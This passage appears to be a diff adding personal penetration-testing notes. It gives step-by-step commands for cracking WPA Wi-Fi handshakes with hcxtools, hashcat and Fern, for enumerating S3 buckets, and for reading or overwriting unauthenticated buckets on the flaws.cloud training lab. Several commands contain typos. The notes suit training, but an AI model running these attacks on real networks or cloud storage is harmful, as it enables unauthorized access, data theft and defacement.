+PREPARING HANDSHAKES FOR CRACKING:
+
+	>sudo apt‐get update
+	>sudo apt‐get install hcxtools
+	>hcxpcapngtool ‐o hash.hc22000 ‐E essidlist dumpfile.pcapng (Convert the captured file with the too // ‐hash.hc22000 is the converted file
+ Essid list will contain the list of SSIDs
+ Dumpfile.pcapng is the source file)
+	>nano essidlist (Check the essidlist file for name of wifi networks)
+	>sudo hcxdumptool ‐i wlan0 ‐‐do_rcascan (Check the BSSID of our network)
+	>nano hash.hc22000 (Delete the excessive information and keep only the target network handshakes)
+	we have our converted file hash.hc22000 /  copy it from Vmware machine to your main Windows Machine
+
+	CONVERT HANDSHAKES CAPTURED THROUGH AIRCRACK SUITE
+	
+	https://hashcat.net/cap2hashcat/ (Use the following official website from hashcatdevelopers to convert the file to proper format(.hc2200))
+	Upload the file
+	Once converted, download it
+	
+CRACKING HANDSHAKES WITH HASHCAT
+	
+	WIN 10
+	https://hashcat.net/hashcat/
+	Copy the handshake file to hashcat directory
+	Download and extract the rockyou dictionary in hashcat folder (https://github.com/brannondorsey/naive‐hashcat/releases/download/data/rockyou.txt)
+	.\Hashcat.exe ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 rockyou.txt (Open the Power shell and then use the command to crack the handshake)
+	You can check cracked.txt in hashcat directory
+	To select a particular device. Just select the device with category flag
+	To select Device 3 only, use –D 2 –d 3
+
+GUI BASED AUTOMATED WIFI CRACKING
+	
+	FERN (Parrot)
+	Locate rockyou
+	sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+	ls /usr/share/wordlists/
+	fern wifi crack
+	Select interface (Fern put automatically in monitor mode)
+	wlan0
+	Scan for Acces Point	
+	Select WPA
+	Select Home
+	Browse
+	wordlists
+	rockyou.txt
+	Click automate
+	Click Home
+
+Cloud security
+
+ENUMERATING S3 BUCKETS	
+
+	lazys3
+	https://github.com/nahamsec/lazys3
+	ruby lazys3.rb <COMPANY> // <pakwheels>
+	pakwheels.s3.amazonws.com
+	ruby lazys3.rb flwas.cloud
+	flwas.cloud.s3.amazonws.com
+
+	Cloud_enum
+	Sudo apt install cloud-enum
+	cloud_enum -k flaws.cloud --disable-azure --disable-gcp
+
+	https://github.com/AlecBlance/S3BucketList
+	Install Browser extensión
+	
+	
+EXPLOTING S3 UNAUTHENTICATED
+
+	Sudo apt install update
+	Sudo ap-get install awscli
+	cloud_enum -k flaws.cloud --disable-azure --disable-gcp
+	aws s3 ls s3://flaw.cloud/ --no-sign-request (unauthenticatedaccess can be listed down with this command)
+	aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request (download the contents of a bucket)
+	cat secret-dd0...
+
+	If the AWS bucket allows write access, we can upload a fileto AWS and can also overwrite the existing files which may result in the defacement of a public website
+	aws s3 cp ./index.html s3://flaws.cloud --no-sign-request
+
+EXPLOITING S3 AUTHENTICATED
+
+	aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request
+	Go to AWS IAM
+	Add a new user with programmatic access
+	Sudo ap-get install awscli
+	configure the profile on aws cli with the keys from the account
+	aws s3 --profile ammar ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+	download the secret file
+
+
+DISK ENCRYPTION WITH VERACRYPT:
+
+CRYPTOFORGE
+
+	https://www.cryptoforge.com/
+
+ENCONDING WITH:
+
+	https://www.jetico.com/free-security-tools/encrypt-text-bctextencoder
+	
+HASH CALCULATORS ON WINDOWS
+
+	Hashcalc
+	https://www.slavasoft.com/download.htm
+	Select any file to get its hash value
